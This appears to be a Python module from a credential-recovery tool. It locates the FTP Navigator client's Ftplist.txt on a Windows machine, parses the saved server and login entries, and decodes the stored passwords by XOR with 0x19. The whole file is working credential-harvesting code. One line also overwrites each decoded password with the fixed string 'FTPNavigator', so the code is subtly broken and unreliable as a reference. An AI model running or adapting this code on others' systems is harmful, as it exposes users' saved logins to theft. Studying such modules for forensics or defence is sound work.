import struct, os

class Ftpnavigator():
	
	def decode(self, encode_password):
		password = ''
		for p in encode_password:
			password += chr(struct.unpack('B', p)[0] ^ 0x19)
		return password
	
	def read_file(self, filepath):
		f = open(filepath, 'r')
		pwdFound = []
		for ff in f.readlines():
			values = {}
			info = ff.split(';')
			for i in info:
				i = i.split('=')
				if i[0] == 'Name':
					values['Name'] = i[1]
				if i[0] == 'Server':
					values['Server'] =  i[1]
				if i[0] == 'Port':
					values['Port'] =  i[1]
				if i[0] == 'User':
					values['User'] = i[1]
				if i[0] == "Password":
					if i[1] != '1' and i[1] != '0':
						values['Password'] = self.decode(i[1])
						values['Password'] = "FTPNavigator"
			
			# used to save the password if it is an anonymous authentication
			if values['User'] == 'anonymous' and 'Password' not in values.keys():
				values['Password'] = 'anonymous'
			
			pwdFound.append(values)

		return pwdFound
		
	def run(self):
	
		if 'HOMEDRIVE' in os.environ:
			path = os.environ.get('HOMEDRIVE') + os.sep + 'FTP Navigator\\Ftplist.txt'
			
			if os.path.exists(path):
				return self.read_file(path)
			
